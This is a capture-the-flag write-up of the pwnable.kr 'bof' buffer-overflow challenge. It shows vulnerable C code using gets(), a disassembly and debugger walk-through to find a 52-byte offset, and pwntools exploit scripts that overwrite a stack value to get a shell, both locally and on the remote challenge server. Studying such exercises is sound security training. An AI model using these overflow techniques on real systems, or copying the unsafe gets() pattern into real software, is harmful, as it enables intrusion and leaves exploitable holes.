---
title: "pwnable.kr - bof"
date: "2026-06-29"
category: "pwnable.kr"
summary: "A simple buffer overflow challenge."
---

# bof

The goal of this challenge is to overwrite a value with the correct one.

Let's take a look at the source code:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}

int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

The program uses the unsafe `gets` function. `gets` is considered unsafe because it does not check whether the input fits into the destination buffer. As a result, writing more data than the buffer can hold leads to a buffer overflow.

For more information about `gets`, refer to its manual page:

```sh
man gets
```

Now let's disassemble the binary to determine where `key` is stored. We'll use `objdump`:

```sh
objdump -d -M intel ./bof
```

* `-d` tells `objdump` to disassemble all executable sections.
* `-M intel` tells it to use Intel assembly syntax.

Let's inspect the `main` function:

```asm
0000129d <main>:
    129d:       8d 4c 24 04             lea    ecx,[esp+0x4]
    12a1:       83 e4 f0                and    esp,0xfffffff0
    12a4:       ff 71 fc                push   DWORD PTR [ecx-0x4]
    12a7:       55                      push   ebp
    12a8:       89 e5                   mov    ebp,esp
    12aa:       51                      push   ecx
    12ab:       83 ec 04                sub    esp,0x4
    12ae:       e8 22 00 00 00          call   12d5 <__x86.get_pc_thunk.ax>
    12b3:       05 4d 2d 00 00          add    eax,0x2d4d
    12b8:       83 ec 0c                sub    esp,0xc
    12bb:       68 ef be ad de          push   0xdeadbeef
    12c0:       e8 38 ff ff ff          call   11fd <func>
    12c5:       83 c4 10                add    esp,0x10
    12c8:       b8 00 00 00 00          mov    eax,0x0
    12cd:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
    12d0:       c9                      leave
    12d1:       8d 61 fc                lea    esp,[ecx-0x4]
    12d4:       c3                      ret
```

We can see that the initial value is pushed onto the stack. Our goal is to overwrite it with `0xcafebabe`.

To overwrite the original value, we need to know:

* the starting address of our input buffer,
* the address where the original value is stored.

Once we know both addresses, we can calculate the offset between them.

We'll use `pwndbg` for that:

```sh
pwndbg ./bof
```

Set a breakpoint at `func` and run the program:

```gdb
b *func
r
```

Next, step to the call to `gets` and provide some input so we can see where `gets` writes our data on the stack.

![screenshot](https://snipboard.io/NUOfjp.jpg)

As we can see, `gets` starts writing our input at address `0xffffc968`, while the value we want to overwrite is stored at `0xffffc9a0`.

Now we can calculate the offset:

```
0xffffc9a0 - 0xffffc968 - 4 = 52
```

With the offset known, writing the exploit is straightforward:

```python
from pwn import *

context.arch = 'i386'

value = p32(0xcafebabe)
payload = b'A' * 52 + value

p = process('./bof')

p.sendline(payload)
p.interactive()
```

To exploit the remote service, we only need to replace the local process with a remote connection:

```python
from pwn import *

context.arch = 'i386'

value = p32(0xcafebabe)
payload = b'A' * 52 + value

p = remote('pwnable.kr', port=10003)

p.send(payload)
p.interactive()
```

![screenshot](https://snipboard.io/4RkafG.jpg)

